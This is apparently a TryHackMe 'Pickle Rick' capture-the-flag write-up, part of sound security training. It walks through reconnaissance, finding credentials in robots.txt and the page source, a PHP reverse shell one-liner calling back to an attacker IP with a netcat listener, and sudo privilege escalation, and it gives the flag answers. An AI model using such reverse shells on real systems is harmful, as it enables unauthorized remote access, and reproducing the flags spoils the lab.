# TryHackMe - Pickle Rick Write-Up
   
**Category:** Web Exploitation / Linux Privilege Escalation  


---

## Reconnaissance

### Nmap Scan

First I ran an nmap scan to see what we're working with.

```bash
nmap -sV -sC -A -p- pickle.thm
```

<img width="975" height="612" alt="image" src="https://github.com/user-attachments/assets/1be55049-7cdf-4696-927c-5ea3af21289f" />


The scan came back with two open ports. Port 22 running OpenSSH 8.2p1 and port 80 running Apache 2.4.41. The HTTP title "Rick is sup4r cool" tells us there's a custom web app running. Since Apache is serving the site, PHP support is likely, which is worth keeping in mind for later. OS fingerprinting also confirmed we're dealing with a Linux x86_64 host.

---

### Directory Brute Forcing

Next I ran directory brute forcing on the web server hosted on port 80 using Gobuster with the dirb big.txt wordlist and 50 threads.

```bash
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://pickle.thm -t 50
```

<img width="975" height="547" alt="image" src="https://github.com/user-attachments/assets/3b37bfa7-938f-44c2-b299-cc31c53fd329" />


Gobuster returned a few interesting paths. `.htpasswd` and `.htaccess` both came back 403, meaning they exist but access is denied. `/assets` redirected to `/assets/` and `/robots.txt` came back 200. The important thing to note here is that no login portal showed up in the results, so I would need to test for that manually later.

---

### robots.txt

After checking out robots.txt I found a string that looks like a potential password.

<img width="975" height="280" alt="image" src="https://github.com/user-attachments/assets/0f34d5d7-c732-458f-abad-e563e021581f" />


Just a single string sitting there with no disallow rules: `Wubbalubbadubdub`. Definitely not a normal robots.txt entry so I held onto it as a likely credential.

---

### Source Code Review

Shortly after I found a valid username in the source code.

<img width="975" height="446" alt="image" src="https://github.com/user-attachments/assets/54e5ceea-d1ca-4e27-a86b-5908b0e961d2" />



So now we have a username and a potential password without doing any brute forcing.

---

### Finding the Login Portal

This indicates there has to be a login portal. The only issue is my dir brute force didn't return any login portal, so next I manually tested for paths. Since it's Apache I tried php extensions and found a portal under the typical `login.php`.

<img width="975" height="472" alt="image" src="https://github.com/user-attachments/assets/84469f10-adaf-4770-8c4a-df1e3f832bdd" />


Navigating to `http://pickle.thm/login.php` brought up a Portal Login Page. Using `R1ckRul3s` as the username and `Wubbalubbadubdub` as the password worked on the first try.

<img width="975" height="317" alt="image" src="https://github.com/user-attachments/assets/2baba1d5-a360-4c29-a75e-ba94edba79bb" />


## Initial Foothold

### Command Panel Enumeration

The login works and now we are at a command panel. I ran `ls -la` and found a couple files.

<img width="975" height="330" alt="image" src="https://github.com/user-attachments/assets/c012183c-cb0d-41d5-a502-f9026da8600a" />


The web root had several files including one called `Sup3rS3cretPickl3Ingred.txt` which is clearly the first flag. Also visible is `clue.txt` and `denied.php`. Before reading anything though I also ran `sudo -l` through the panel to check what the current user can do.

<img width="975" height="283" alt="image" src="https://github.com/user-attachments/assets/045b3ab0-eadd-4c01-a726-7d9f8fafd9ae" />


The `www-data` user can run everything as root with no password required. This is a major misconfiguration and means once we get a proper shell, escalating to root will be trivial.

---

### cat is Blocked

Next I simply tried to cat out one of the files but got a pop up that let me know this is not as straightforward as I thought.

<img width="975" height="334" alt="image" src="https://github.com/user-attachments/assets/424cd382-f865-4aec-97b9-24d1824fd7ce" />


`cat` is blacklisted in the command panel. This restriction only applies to the web panel though so the plan was to get a reverse shell where I could use it freely.

---

### PHP Reverse Shell

I set up a Netcat listener on my attacker machine first.

```bash
nc -nvlp 4444
```

Then I submitted a PHP reverse shell one-liner through the command panel targeting my listener.

```php
php -r '$sock=fsockopen("10.67.109.64",4444);exec("/bin/sh -i &3 2>&3");'
```

Next I attempted to connect via PHP reverse shell and it worked. We have shell.

<img width="975" height="358" alt="image" src="https://github.com/user-attachments/assets/d4c27aab-a94e-4a20-97a9-7f729983cab4" />


Connection came back as `www-data`. I tried to stabilize the shell with Python but it wasn't installed on the box.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
# /bin/sh: 3: python: not found
```

eh that's fine, was just doing it to be thorough.

---

## Flag Capture

### Flag 1

Since cat is no longer restricted outside the web panel I just read the file directly.

```bash
cat Sup3rS3cretPickl3Ingred.txt
```

<img width="906" height="488" alt="image" src="https://github.com/user-attachments/assets/9441789c-e1bd-4bb5-bfa0-9ebafc9c9930" />


**Flag 1:** `mr. meeseek hair`

---

### Flag 2

Next I entered the home directory to find the user rick, listed his files and found the second flag.

```bash
cd /home && ls
# rick  ubuntu
cd rick && ls
# second ingredients
```

The filename has a space in it so running `cat second ingredients` failed since the shell treated them as two separate arguments. Quoting the filename fixed it.

```bash
cat "second ingredients"
```

<img width="853" height="470" alt="image" src="https://github.com/user-attachments/assets/ce195cad-ef98-4243-a0e0-1e33e067ef94" />


**Flag 2:** `1 jerry tear`

---

### Flag 3

Time to look for the third flag, or "ingredient" as they are calling it. I listed out all components in the `/` directory and saw the `root` folder. This is where those sudo privileges come into play.

```bash
ls /
sudo cat /root/3rd.txt
```

<img width="414" height="86" alt="image" src="https://github.com/user-attachments/assets/9d5d0e35-efe8-4018-a2d9-1e3f026602bb" />


Since `www-data` has `NOPASSWD: ALL` sudo rights, reading a root-owned file was as simple as prefixing with `sudo`.

**Flag 3:** `3rd ingredients: fleeb juice`

---

## Challenge Completed
